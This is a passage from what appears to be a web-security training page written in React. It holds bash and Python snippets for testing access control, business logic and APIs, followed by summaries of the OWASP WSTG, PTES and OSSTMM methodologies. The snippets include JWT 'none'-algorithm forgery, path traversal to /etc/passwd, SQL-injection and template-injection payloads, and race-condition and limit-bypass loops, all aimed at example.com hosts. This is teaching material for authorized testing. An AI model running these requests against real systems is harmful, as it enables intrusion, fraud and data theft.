                    headers={'Authorization': 'Bearer token123'})
    if r.status_code != 404:
        print(f'Potential IDOR: {test_uuid} - Status: {r.status_code}')
"

# Vertical Privilege Escalation Testing
# Test admin functions with regular user token
curl -H "Authorization: Bearer regular_user_token" https://example.com/admin/users
curl -H "Authorization: Bearer regular_user_token" https://example.com/admin/settings
curl -X POST -H "Authorization: Bearer regular_user_token" -d '{"role":"admin"}' https://example.com/api/users/promote

# Role manipulation via parameters
curl -X POST -d "username=testuser&password=password&role=admin" https://example.com/register
curl -X PUT -H "Authorization: Bearer token" -d '{"role":"administrator"}' https://example.com/api/profile

# Horizontal Privilege Escalation
# User A trying to access User B's data
curl -H "Authorization: Bearer userA_token" https://example.com/api/users/userB/profile
curl -H "Authorization: Bearer userA_token" https://example.com/api/users/userB/orders

# Function-Level Access Control Testing
# Test all HTTP methods on sensitive endpoints
for method in GET POST PUT DELETE PATCH HEAD OPTIONS; do
  curl -X $method -H "Authorization: Bearer user_token" https://example.com/admin/users
done

# Path Traversal in Authorization Context
curl -H "Authorization: Bearer token" https://example.com/files/../../../etc/passwd
curl -H "Authorization: Bearer token" https://example.com/documents/../../admin/config.xml

# Cookie-Based Role Manipulation
# Modify role in JWT token
python3 -c "
import jwt
import json
token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0...'
decoded = jwt.decode(token, verify=False)
decoded['role'] = 'admin'
new_token = jwt.encode(decoded, algorithm='none')
print(new_token)
"

# Session-based role escalation
curl -c cookies.txt -d "user=regularuser&pass=password" https://example.com/login
# Modify session data
sed -i 's/role=user/role=admin/' cookies.txt
curl -b cookies.txt https://example.com/admin/dashboard

# API Key Authorization Testing
# Test different API keys
api_keys=("key1" "key2" "admin_key" "test_key")
for key in "${api_keys[@]}"; do
  curl -H "X-API-Key: $key" https://example.com/api/sensitive-data
done

# OAuth Scope Testing
# Test different OAuth scopes
scopes=("read" "write" "admin" "delete" "manage")
for scope in "${scopes[@]}"; do
  curl -H "Authorization: Bearer oauth_token_$scope" https://example.com/api/admin/users
done

# Multi-Tenant Access Control Testing
# Test cross-tenant data access
curl -H "Authorization: Bearer tenant1_token" https://example.com/api/tenant2/data
curl -H "X-Tenant-ID: tenant2" -H "Authorization: Bearer tenant1_token" https://example.com/api/data

# Time-based Access Control Testing
# Test access during restricted hours
python3 -c "
import requests
import time
# Test access at different times
for hour in range(24):
    # Simulate different times (would need actual time manipulation)
    r = requests.get('https://example.com/time-restricted-resource',
                    headers={'Authorization': 'Bearer token123'})
    print(f'Hour {hour}: Status {r.status_code}')
"

# GraphQL Authorization Testing
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"query { allUsers { id name email adminNotes } }"}' \
  https://example.com/graphql

# Mass Assignment Testing
curl -X POST -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@example.com","isAdmin":true,"role":"admin"}' \
  https://example.com/api/users

# File Access Authorization
curl -H "Authorization: Bearer user_token" https://example.com/files/admin_only_file.pdf
curl -H "Authorization: Bearer user_token" https://example.com/uploads/../config/database.xml

# WebSocket Authorization Testing
python3 -c "
import websocket
ws = websocket.WebSocket()
ws.connect('wss://example.com/ws')
ws.send('{\"action\":\"admin_command\",\"token\":\"user_token\"}')
print(ws.recv())
ws.close()
"`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="business-logic">
            <AccordionTrigger className="text-lg font-semibold">
              Business Logic & Workflow Security Testing
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Business Logic Vulnerability Categories</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">Workflow Manipulation</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Step skipping in multi-step processes</li>
                        <li>• Process reversal and backward navigation</li>
                        <li>• Parallel processing exploitation</li>
                        <li>• State corruption attacks</li>
                        <li>• Time manipulation in workflows</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">Economic Logic Flaws</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Price manipulation attacks</li>
                        <li>• Quantity bypass (negative values)</li>
                        <li>• Currency conversion exploitation</li>
                        <li>• Discount stacking abuse</li>
                        <li>• Tax calculation bypass</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Industry-Specific Scenarios</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">E-commerce Testing</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Shopping cart manipulation</li>
                        <li>• Payment process abuse</li>
                        <li>• Inventory management flaws</li>
                        <li>• Shipping logic bypass</li>
                        <li>• Return/refund exploitation</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
                      <h6 className="font-semibold text-orange-400 mb-2">Financial Services</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Transaction limit bypass</li>
                        <li>• Transfer logic manipulation</li>
                        <li>• Account balance corruption</li>
                        <li>• Interest calculation flaws</li>
                        <li>• Regulatory compliance bypass</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Advanced Business Logic Testing Scenarios"
                code={`# E-commerce Business Logic Testing
# Price manipulation attacks
curl -X POST -d "item_id=123&quantity=1&price=0.01" https://shop.example.com/checkout
curl -X POST -d "item_id=123&quantity=-1&price=100" https://shop.example.com/add-to-cart

# Coupon code abuse
curl -X POST -d "coupon=SAVE50&coupon=SAVE30&coupon=FREESHIP" https://shop.example.com/apply-coupons
python3 -c "
import requests
for i in range(100):
    requests.post('https://shop.example.com/apply-coupon', 
                 data={'coupon': 'SAVE50', 'user_id': 123})
"

# Inventory manipulation
curl -X POST -d "item_id=123&quantity=999999" https://shop.example.com/reserve-item
curl -X POST -d "item_id=123&quantity=1&reserve_time=9999999999" https://shop.example.com/cart

# Race condition in limited offers
for i in {1..50}; do
  curl -X POST -d "offer_id=limited_offer_123&user_id=$i" https://shop.example.com/claim-offer &
done
wait

# Multi-step workflow bypass
# Step 1: Add item to cart
curl -c cookies.txt -X POST -d "item_id=123" https://shop.example.com/add-to-cart
# Step 2: Skip payment and go directly to order confirmation
curl -b cookies.txt https://shop.example.com/order-complete?order_id=12345

# Banking/Financial Logic Testing
# Transfer limit bypass
curl -X POST -H "Authorization: Bearer token" \
  -d "from_account=12345&to_account=67890&amount=1000000" \
  https://bank.example.com/transfer

# Multiple small transfers to bypass daily limits
for amount in {1..1000}; do
  curl -X POST -H "Authorization: Bearer token" \
    -d "from_account=12345&to_account=67890&amount=$amount" \
    https://bank.example.com/transfer
done

# Time-based logic flaws
# Backdated transactions
curl -X POST -H "Authorization: Bearer token" \
  -d "amount=5000&date=2020-01-01T00:00:00Z" \
  https://bank.example.com/deposit

# Gaming Logic Testing
# Score manipulation
curl -X POST -H "Authorization: Bearer token" \
  -d "score=999999999&game_id=123" \
  https://game.example.com/submit-score

# Item duplication
curl -X POST -H "Authorization: Bearer token" \
  -d "item_id=rare_sword&action=trade&target_user=alt_account" \
  https://game.example.com/trade &
curl -X POST -H "Authorization: Bearer token" \
  -d "item_id=rare_sword&action=sell&price=1000" \
  https://game.example.com/marketplace &

# Subscription/SaaS Logic Testing
# Feature access bypass
curl -H "Authorization: Bearer basic_user_token" \
  https://saas.example.com/premium/analytics

# Usage limit bypass
for i in {1..10000}; do
  curl -H "Authorization: Bearer token" \
    https://api.example.com/premium-endpoint &
  if [ $((i % 100)) -eq 0 ]; then echo "Request $i sent"; fi
done

# Social Media Logic Testing
# Privacy bypass
curl -H "Authorization: Bearer user1_token" \
  https://social.example.com/api/users/private_user/posts

# Follower manipulation
python3 -c "
import requests
import threading

def follow_unfollow():
    for i in range(1000):
        requests.post('https://social.example.com/follow', 
                     data={'target_user': 'celebrity123'},
                     headers={'Authorization': 'Bearer token'})
        requests.post('https://social.example.com/unfollow', 
                     data={'target_user': 'celebrity123'},
                     headers={'Authorization': 'Bearer token'})

for _ in range(10):
    threading.Thread(target=follow_unfollow).start()
"

# Voting/Rating System Manipulation
# Multiple votes from same user
curl -X POST -H "Authorization: Bearer token" \
  -d "rating=5&product_id=123" \
  https://review.example.com/submit-rating
# Clear cookies/session and vote again
curl -X POST -d "rating=5&product_id=123" \
  https://review.example.com/submit-rating

# File sharing logic flaws
# Access control bypass via direct link
curl https://files.example.com/download/private_file_xyz.pdf
# Share link manipulation
curl https://files.example.com/share/public_link_123?file=../../../private/confidential.pdf

# Booking/Reservation System Testing
# Double booking
curl -X POST -d "room_id=101&date=2024-01-01&user_id=123" \
  https://hotel.example.com/book &
curl -X POST -d "room_id=101&date=2024-01-01&user_id=456" \
  https://hotel.example.com/book &

# Time zone manipulation
curl -X POST -d "resource_id=conference_room&start_time=2024-01-01T14:00:00Z&timezone=UTC" \
  https://booking.example.com/reserve
curl -X POST -d "resource_id=conference_room&start_time=2024-01-01T14:00:00-08:00&timezone=PST" \
  https://booking.example.com/reserve

# Multi-tenant logic testing
# Cross-tenant data access
curl -H "Authorization: Bearer tenant1_token" \
  -H "X-Tenant-ID: tenant2" \
  https://saas.example.com/api/data

# Loyalty program manipulation
# Points accumulation bypass
curl -X POST -H "Authorization: Bearer token" \
  -d "action=purchase&amount=1000000&points_multiplier=100" \
  https://loyalty.example.com/earn-points`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="api-security-testing">
            <AccordionTrigger className="text-lg font-semibold">
              API Security Testing & Modern Web Technologies
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">REST API Security Testing</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">HTTP Method Testing</h6>
                      <ul className="text-sm space-y-1">
                        <li>• GET, POST, PUT, DELETE, PATCH verification</li>
                        <li>• OPTIONS method information disclosure</li>
                        <li>• HTTP method override attacks</li>
                        <li>• Verb tampering for access control bypass</li>
                        <li>• Custom HTTP methods exploration</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">Parameter Manipulation</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Query parameter pollution attacks</li>
                        <li>• Path parameter injection</li>
                        <li>• Header parameter manipulation</li>
                        <li>• Content-Type confusion attacks</li>
                        <li>• API versioning bypass techniques</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">GraphQL Security Assessment</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">Query Complexity Attacks</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Deeply nested query attacks</li>
                        <li>• Circular reference exploitation</li>
                        <li>• Resource exhaustion via complex queries</li>
                        <li>• Batch query abuse</li>
                        <li>• Query cost analysis bypass</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
                      <h6 className="font-semibold text-orange-400 mb-2">Information Disclosure</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Introspection query abuse</li>
                        <li>• Schema information extraction</li>
                        <li>• Error message information leakage</li>
                        <li>• Field-level authorization bypass</li>
                        <li>• Debug mode exploitation</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Comprehensive API Security Testing"
                code={`# REST API Comprehensive Testing
# HTTP Method Enumeration
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT; do
  echo "Testing $method method:"
  curl -X $method -i https://api.example.com/users/123
done

# API Endpoint Discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://api.example.com/v1/FUZZ -mc 200,400,401,403,500

# Parameter Pollution Testing
curl "https://api.example.com/search?category=books&category=electronics&sort=price"
curl -X POST -d "user_id=123&user_id=456&action=delete" https://api.example.com/users

# Content-Type Confusion
curl -X POST -H "Content-Type: application/json" \
  -d "username=admin&password=password" https://api.example.com/login
curl -X POST -H "Content-Type: application/xml" \
  -d "<login><username>admin</username><password>password</password></login>" \
  https://api.example.com/login

# API Version Testing
for version in v1 v2 v3 beta alpha; do
  curl https://api.example.com/$version/users/profile
done

# Rate Limiting Testing
python3 -c "
import requests
import threading
import time

def api_request():
    for i in range(1000):
        r = requests.get('https://api.example.com/data', 
                       headers={'Authorization': 'Bearer token123'})
        if r.status_code == 429:
            print(f'Rate limited at request {i}')
            break
        time.sleep(0.01)

for _ in range(10):
    threading.Thread(target=api_request).start()
"

# CORS Policy Testing
curl -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization" \
  -X OPTIONS https://api.example.com/sensitive

# JWT API Testing
python3 jwt_tool.py -t https://api.example.com/profile \
  -rh "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

# GraphQL Security Testing
# Introspection Query
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}' \
  https://api.example.com/graphql

# Query Complexity Attack
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"query { user(id: \"1\") { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } } } }"}' \
  https://api.example.com/graphql

# Batch Query Attack
curl -X POST -H "Content-Type: application/json" \
  -d '[{"query":"query { user(id: \"1\") { name } }"},{"query":"query { user(id: \"2\") { name } }"},{"query":"query { user(id: \"3\") { name } }"}]' \
  https://api.example.com/graphql

# GraphQL Injection Testing
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"query { user(id: \"1\" OR \"1\"=\"1\") { name email } }"}' \
  https://api.example.com/graphql

# WebSocket API Testing
python3 -c "
import websocket
import json

def on_message(ws, message):
    print(f'Received: {message}')

def on_error(ws, error):
    print(f'Error: {error}')

def on_close(ws):
    print('Connection closed')

def on_open(ws):
    # Test authentication bypass
    ws.send(json.dumps({'action': 'authenticate', 'token': 'invalid_token'}))
    # Test admin commands
    ws.send(json.dumps({'action': 'admin_command', 'command': 'list_users'}))
    # Test injection
    ws.send(json.dumps({'action': 'search', 'query': '\'; DROP TABLE users;--'}))

ws = websocket.WebSocketApp('wss://api.example.com/ws',
                          on_message=on_message,
                          on_error=on_error,
                          on_close=on_close)
ws.on_open = on_open
ws.run_forever()
"

# gRPC API Testing
# Generate protobuf definitions
grpcurl -plaintext api.example.com:9090 list
grpcurl -plaintext api.example.com:9090 describe UserService
grpcurl -plaintext -d '{"user_id": "123"}' api.example.com:9090 UserService/GetUser

# SOAP API Testing
curl -X POST -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: getUserInfo" \
  -d '<?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <getUserInfo>
            <userId>123</userId>
          </getUserInfo>
        </soap:Body>
      </soap:Envelope>' \
  https://api.example.com/soap

# API Documentation Testing
# Swagger/OpenAPI endpoint discovery
curl https://api.example.com/swagger.json
curl https://api.example.com/api-docs
curl https://api.example.com/openapi.json
curl https://api.example.com/docs

# Mobile API Testing
# iOS User-Agent
curl -H "User-Agent: MyApp/1.0 (iPhone; iOS 15.0; Scale/3.00)" \
  https://api.example.com/mobile/data

# Android User-Agent
curl -H "User-Agent: MyApp/1.0 (Linux; Android 12; SM-G991B)" \
  https://api.example.com/mobile/data

# API Key Testing
api_keys=("test" "admin" "debug" "api_key" "12345" "key123")
for key in "${api_keys[@]}"; do
  curl -H "X-API-Key: $key" https://api.example.com/data
  curl -H "Authorization: API-Key $key" https://api.example.com/data
done

# Server-Sent Events (SSE) Testing
curl -N -H "Accept: text/event-stream" https://api.example.com/events

# API Fuzzing with Custom Payloads
python3 -c "
import requests
import json

payloads = [
    {'test': '../../../etc/passwd'},
    {'test': '<script>alert(1)</script>'},
    {'test': '\'; DROP TABLE users;--'},
    {'test': '{{7*7}}'},
    {'test': '\${7*7}'},
    {'test': 'A' * 10000}
]

for payload in payloads:
    try:
        r = requests.post('https://api.example.com/process', 
                         json=payload, timeout=5)
        if r.status_code != 400:
            print(f'Potential vulnerability with payload: {payload}')
            print(f'Response: {r.text[:200]}')
    except:
        pass
"`}
              />
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>

      {/* Professional Methodologies */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <BookOpen className="h-7 w-7 text-cybr-primary" />
          Professional Testing Methodologies & Frameworks
        </h3>
        
        <Accordion type="single" collapsible className="space-y-4">
          <AccordionItem value="owasp-comprehensive">
            <AccordionTrigger className="text-lg font-semibold">
              OWASP Web Security Testing Guide (WSTG) - Complete Implementation
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">WSTG Testing Categories (Complete)</h5>
                  <div className="space-y-2">
                    <div className="p-2 bg-blue-900/20 border border-blue-500 rounded text-sm">
                      <strong className="text-blue-400">WSTG-INFO:</strong> Information Gathering (10 tests)
                    </div>
                    <div className="p-2 bg-green-900/20 border border-green-500 rounded text-sm">
                      <strong className="text-green-400">WSTG-CONF:</strong> Configuration Management (11 tests)
                    </div>
                    <div className="p-2 bg-yellow-900/20 border border-yellow-500 rounded text-sm">
                      <strong className="text-yellow-400">WSTG-IDNT:</strong> Identity Management (5 tests)
                    </div>
                    <div className="p-2 bg-purple-900/20 border border-purple-500 rounded text-sm">
                      <strong className="text-purple-400">WSTG-ATHN:</strong> Authentication (10 tests)
                    </div>
                    <div className="p-2 bg-red-900/20 border border-red-500 rounded text-sm">
                      <strong className="text-red-400">WSTG-AUTHZ:</strong> Authorization (4 tests)
                    </div>
                    <div className="p-2 bg-orange-900/20 border border-orange-500 rounded text-sm">
                      <strong className="text-orange-400">WSTG-SESS:</strong> Session Management (9 tests)
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Additional WSTG Categories</h5>
                  <div className="space-y-2">
                    <div className="p-2 bg-cyan-900/20 border border-cyan-500 rounded text-sm">
                      <strong className="text-cyan-400">WSTG-INPV:</strong> Input Validation (20 tests)
                    </div>
                    <div className="p-2 bg-pink-900/20 border border-pink-500 rounded text-sm">
                      <strong className="text-pink-400">WSTG-ERRH:</strong> Error Handling (2 tests)
                    </div>
                    <div className="p-2 bg-lime-900/20 border border-lime-500 rounded text-sm">
                      <strong className="text-lime-400">WSTG-CRYP:</strong> Cryptography (4 tests)
                    </div>
                    <div className="p-2 bg-violet-900/20 border border-violet-500 rounded text-sm">
                      <strong className="text-violet-400">WSTG-BUSLOGIC:</strong> Business Logic (9 tests)
                    </div>
                    <div className="p-2 bg-rose-900/20 border border-rose-500 rounded text-sm">
                      <strong className="text-rose-400">WSTG-CLIENT:</strong> Client-side Testing (13 tests)
                    </div>
                    <div className="p-2 bg-amber-900/20 border border-amber-500 rounded text-sm">
                      <strong className="text-amber-400">WSTG-APIT:</strong> API Testing (9 tests)
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="mt-6">
                <h5 className="font-semibold mb-3 text-cybr-primary">OWASP Top 10 2021 Mapping</h5>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <div className="p-3 bg-red-900/20 border border-red-500 rounded">
                      <h6 className="font-semibold text-red-400">A01:2021 - Broken Access Control</h6>
                      <ul className="text-sm mt-2 space-y-1">
                        <li>• WSTG-AUTHZ-01: Directory traversal</li>
                        <li>• WSTG-AUTHZ-02: Authorization bypass</li>
                        <li>• WSTG-AUTHZ-03: Privilege escalation</li>
                        <li>• WSTG-AUTHZ-04: Insecure direct object references</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
                      <h6 className="font-semibold text-orange-400">A02:2021 - Cryptographic Failures</h6>
                      <ul className="text-sm mt-2 space-y-1">
                        <li>• WSTG-CRYP-01: Weak SSL/TLS ciphers</li>
                        <li>• WSTG-CRYP-02: Padding oracle</li>
                        <li>• WSTG-CRYP-03: Sensitive data exposure</li>
                        <li>• WSTG-CRYP-04: Weak random number generation</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-yellow-900/20 border border-yellow-500 rounded">
                      <h6 className="font-semibold text-yellow-400">A03:2021 - Injection</h6>
                      <ul className="text-sm mt-2 space-y-1">
                        <li>• WSTG-INPV-05: SQL injection</li>
                        <li>• WSTG-INPV-06: LDAP injection</li>
                        <li>• WSTG-INPV-07: XML injection</li>
                        <li>• WSTG-INPV-11: Code injection</li>
                        <li>• WSTG-INPV-12: Command injection</li>
                      </ul>
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
                      <h6 className="font-semibold text-blue-400">A07:2021 - Identification & Authentication</h6>
                      <ul className="text-sm mt-2 space-y-1">
                        <li>• WSTG-ATHN-01: Authentication bypass</li>
                        <li>• WSTG-ATHN-02: Default credentials</li>
                        <li>• WSTG-ATHN-03: Weak lock-out mechanisms</li>
                        <li>• WSTG-ATHN-04: Authentication scheme bypass</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
                      <h6 className="font-semibold text-green-400">A10:2021 - Server-Side Request Forgery</h6>
                      <ul className="text-sm mt-2 space-y-1">
                        <li>• WSTG-INPV-19: Server-side request forgery</li>
                        <li>• Cloud metadata service access</li>
                        <li>• Internal network enumeration</li>
                        <li>• Port scanning via SSRF</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
                      <h6 className="font-semibold text-purple-400">Business Logic Testing</h6>
                      <ul className="text-sm mt-2 space-y-1">
                        <li>• WSTG-BUSLOGIC-01: Data validation logic</li>
                        <li>• WSTG-BUSLOGIC-02: Forged requests</li>
                        <li>• WSTG-BUSLOGIC-03: Integrity checks</li>
                        <li>• WSTG-BUSLOGIC-04: Process timing</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="ptes-framework">
            <AccordionTrigger className="text-lg font-semibold">
              PTES (Penetration Testing Execution Standard) - Complete Framework
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">PTES Seven-Phase Methodology</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">1. Pre-engagement Interactions</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Scoping discussions and target definition</li>
                        <li>• Rules of engagement establishment</li>
                        <li>• Timeline and resource allocation</li>
                        <li>• Legal documentation and NDAs</li>
                        <li>• Communication protocols setup</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">2. Intelligence Gathering</h6>
                      <ul className="text-sm space-y-1">
                        <li>• OSINT collection and analysis</li>
                        <li>• Target asset identification</li>
                        <li>• Network footprinting</li>
                        <li>• Social engineering preparation</li>
                        <li>• Physical security assessment</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-yellow-900/20 border border-yellow-500 rounded">
                      <h6 className="font-semibold text-yellow-400 mb-2">3. Threat Modeling</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Attack surface analysis</li>
                        <li>• Threat actor profiling</li>
                        <li>• Attack vector prioritization</li>
                        <li>• Business impact assessment</li>
                        <li>• Risk-based testing approach</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Advanced PTES Phases</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">4. Vulnerability Analysis</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Automated and manual vulnerability scanning</li>
                        <li>• False positive elimination</li>
                        <li>• Exploitation feasibility assessment</li>
                        <li>• CVSS scoring and risk analysis</li>
                        <li>• Custom vulnerability research</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-red-900/20 border border-red-500 rounded">
                      <h6 className="font-semibold text-red-400 mb-2">5. Exploitation</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Initial compromise and foothold</li>
                        <li>• Privilege escalation techniques</li>
                        <li>• Lateral movement and persistence</li>
                        <li>• Data collection and exfiltration</li>
                        <li>• Attack chain documentation</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
                      <h6 className="font-semibold text-orange-400 mb-2">6. Post Exploitation & 7. Reporting</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Network mapping and trust relationships</li>
                        <li>• Business impact demonstration</li>
                        <li>• Evidence collection and preservation</li>
                        <li>• Executive and technical reporting</li>
                        <li>• Remediation roadmap development</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="mt-6">
                <h5 className="font-semibold mb-3 text-cybr-primary">PTES Risk Rating Framework</h5>
                <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
                  <div className="p-3 bg-red-900/20 border border-red-500 rounded text-center">
                    <h6 className="font-semibold text-red-400 mb-1">Critical</h6>
                    <p className="text-xs">Immediate threat to business operations</p>
                  </div>
                  <div className="p-3 bg-orange-900/20 border border-orange-500 rounded text-center">
                    <h6 className="font-semibold text-orange-400 mb-1">High</h6>
                    <p className="text-xs">Significant security risk requiring urgent attention</p>
                  </div>
                  <div className="p-3 bg-yellow-900/20 border border-yellow-500 rounded text-center">
                    <h6 className="font-semibold text-yellow-400 mb-1">Medium</h6>
                    <p className="text-xs">Moderate security concern</p>
                  </div>
                  <div className="p-3 bg-blue-900/20 border border-blue-500 rounded text-center">
                    <h6 className="font-semibold text-blue-400 mb-1">Low</h6>
                    <p className="text-xs">Minor security issue with limited impact</p>
                  </div>
                  <div className="p-3 bg-green-900/20 border border-green-500 rounded text-center">
                    <h6 className="font-semibold text-green-400 mb-1">Info</h6>
                    <p className="text-xs">Informational finding for awareness</p>
                  </div>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="osstmm-methodology">
            <AccordionTrigger className="text-lg font-semibold">
              OSSTMM (Open Source Security Testing Methodology) - Scientific Approach
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">OSSTMM Security Analysis Framework</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">Core Security Metrics</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>Porosity:</strong> System openness measurement</li>
                        <li>• <strong>Limitations:</strong> Security control boundaries</li>
                        <li>• <strong>Controls:</strong> Protective mechanism effectiveness</li>
                        <li>• <strong>Trust:</strong> Relationship verification strength</li>
                        <li>• <strong>Visibility:</strong> Information exposure assessment</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">Scientific Principles</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Reproducible and consistent results</li>
                        <li>• Measurable security quantification</li>
                        <li>• Objective analysis methodology</li>
                        <li>• Peer-reviewable testing procedures</li>
                        <li>• Evidence-based security assessment</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">OSSTMM Testing Channels</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">1. Human Security Testing</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Social engineering attack simulations</li>
                        <li>• Physical security and access controls</li>
                        <li>• Personnel security awareness assessment</li>
                        <li>• Training effectiveness evaluation</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
                      <h6 className="font-semibold text-orange-400 mb-2">2. Physical Security Testing</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Perimeter security assessment</li>
                        <li>• Building security controls</li>
                        <li>• Environmental control systems</li>
                        <li>• Asset protection mechanisms</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cyan-900/20 border border-cyan-500 rounded">
                      <h6 className="font-semibold text-cyan-400 mb-2">3. Wireless & Network Security</h6>
                      <ul className="text-sm space-y-1">
